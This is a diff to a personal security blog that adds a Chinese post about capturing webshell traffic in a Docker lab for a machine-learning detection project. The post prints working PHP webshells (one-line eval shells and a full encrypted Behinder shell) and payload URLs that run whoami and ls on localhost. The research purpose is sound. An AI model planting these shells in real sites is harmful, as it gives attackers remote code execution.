@@ -163,6 +163,137 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/02/2024-09-02-webshell%20%E6%8A%93%E5%8C%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QST137">
+      <meta itemprop="description" content="三山岁岁有人去，唯恐海风生白波。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QST's kawa BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/02/2024-09-02-webshell%20%E6%8A%93%E5%8C%85/" class="post-title-link" itemprop="url">webshell 抓包</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-09-02 00:00:00 / Modified: 19:47:57" itemprop="dateCreated datePublished" datetime="2024-09-02T00:00:00+08:00">2024-09-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="webshell-抓包"><a href="#webshell-抓包" class="headerlink" title="webshell 抓包"></a>webshell 抓包</h1><p>小学期“网络安全课程设计”做了一个机器学习流量分析的选题，组内大佬结合我主业，发配我负责采集 PHPwebshell 流量；</p>
+<p><img src="https://i.imgur.com/QvSKkWe.png"></p>
+<p><img src="https://i.imgur.com/wmNLyw6.png"></p>
+<p>两个问题：</p>
+<ol>
+<li>我想用 docker 部署靶机环境，如何用 wireshark 抓 docker 流量，没干过；</li>
+<li>https 没配过；</li>
+</ol>
+<p>思路是用 docker 起一个 php 环境，配好 https ，然后分别去连几种 webshell ，抓下流量；</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="起镜像"><a href="#起镜像" class="headerlink" title="起镜像"></a>起镜像</h3><p><strong>镜像版本</strong>：<code>docker pull php:8.4-rc-apache-bullseye</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-d</span> <span class="literal">-p</span> <span class="number">9000</span>:<span class="number">80</span> <span class="literal">-p</span> <span class="number">9001</span>:<span class="number">443</span> `</span><br><span class="line"><span class="literal">-v</span> D:/works/traffics/<span class="number">240902</span>webshelltraffics/html:/var/www/html `</span><br><span class="line"><span class="literal">--name</span> webshell<span class="literal">-traffic</span> php:<span class="number">8.4</span><span class="literal">-rc-apache-bullseye</span></span><br></pre></td></tr></table></figure>
+
+<p>映射一下，方便传马（多此一举了其实）；</p>
+<h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> /var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<p> 访问 9000 端口，检测到空文件，成功；</p>
+<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h3 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h3><p>首先安装<code>tcpdump</code>，用于抓包；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w /tmp/capture.pcap</span><br></pre></td></tr></table></figure>
+
+<p>把包保存到<code>/tmp</code>里；</p>
+<p>访问几次<code>index.php</code>，保存流量；</p>
+<p>copy 到本机，然后打开查看；</p>
+<p><img src="https://i.imgur.com/K0S5zcU.png"></p>
+<p>然后配置<code>https</code>加密流量，同样的方法抓；</p>
+<h4 id="https-配置"><a href="#https-配置" class="headerlink" title="https 配置"></a>https 配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 ssl</span></span><br><span class="line">a2enmod ssl</span><br><span class="line"><span class="comment"># 创建 ssl 目录</span></span><br><span class="line"><span class="built_in">mkdir</span> /etc/apache2/ssl</span><br><span class="line"><span class="comment"># 生成自签名证书</span></span><br><span class="line">openssl req -x509 -nodes -days 365 \</span><br><span class="line">    -newkey rsa:2048 \</span><br><span class="line">    -keyout /etc/apache2/ssl/apache.key \</span><br><span class="line">    -out /etc/apache2/ssl/apache.crt \</span><br><span class="line">    -subj <span class="string">&quot;/C=US/ST=State/L=City/O=Organization/OU=Department/CN=localhost&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改<code>/etc/apache2/sites-available/default-ssl.conf</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;\n&lt;VirtualHost *:443&gt;\n\</span><br><span class="line">    DocumentRoot /var/www/html\n\</span><br><span class="line">    SSLEngine on\n\</span><br><span class="line">    SSLCertificateFile /etc/apache2/ssl/apache.crt\n\</span><br><span class="line">    SSLCertificateKeyFile /etc/apache2/ssl/apache.key\n\</span><br><span class="line">&lt;/VirtualHost&gt;\n&quot; &gt;&gt; /etc/apache2/sites-available/default-ssl.conf</span><br></pre></td></tr></table></figure>
+
+<p>启用配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a2ensite default-ssl.conf</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>https://localhost:9001/</code>成功；</p>
+<h3 id="传统-webshell"><a href="#传统-webshell" class="headerlink" title="传统 webshell"></a>传统 webshell</h3><p><strong>basic-webshell.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;QST&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<p><code>https://localhost:9001/basic-webshell.php?QST=echo(exec(%27whoami%27));</code></p>
+<p><code>https://localhost:9001/basic-webshell.php?QST=echo(exec(%27ls%27));</code></p>
+<p>可以看到一些 https 的特征：</p>
+<p><img src="https://i.imgur.com/Xe2hAm2.png"></p>
+<h3 id="Antsword（蚁剑）"><a href="#Antsword（蚁剑）" class="headerlink" title="Antsword（蚁剑）"></a>Antsword（蚁剑）</h3><p><strong>antsword-webshell.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;QST&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>连接webshell：</p>
+<p><img src="https://i.imgur.com/Rh6NtrJ.png"></p>
+<p>在操作 webshell 过程中抓包；</p>
+<p>这里有个问题，我的自签名 ssl 证书在用蚁剑连的时候会报：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;DEPTH_ZERO_SELF_SIGNED_CERT&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>忽略 https 证书即可；</p>
+<p><img src="https://i.imgur.com/Lvvqqu6.png"></p>
+<p>随便点点，抓到一些包：</p>
+<p><img src="https://i.imgur.com/Z9HjKWI.png"></p>
+<p><img src="https://i.imgur.com/OZtdCHG.png"></p>
+<p>特征差不多；</p>
+<h3 id="Behinder（冰蝎）"><a href="#Behinder（冰蝎）" class="headerlink" title="Behinder（冰蝎）"></a>Behinder（冰蝎）</h3><p><strong>behinder-webshell.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;f14b485168197a68&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，连接密码QST</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>同样，操作 webshell 同时抓包：</p>
+<p><img src="https://i.imgur.com/MQWTQyD.png"></p>
+<p>比之前的包大一两个数量级；</p>
+<p><img src="https://i.imgur.com/mm5DFiT.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>抓了一些常用的 webshell ，希望有用。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/30/2024-08-30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -194,7 +325,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-08-31 23:35:00" itemprop="dateModified" datetime="2024-08-31T23:35:00+08:00">2024-08-31</time>
+                <time title="Modified: 2024-09-02 01:41:32" itemprop="dateModified" datetime="2024-09-02T01:41:32+08:00">2024-09-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -625,20 +756,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
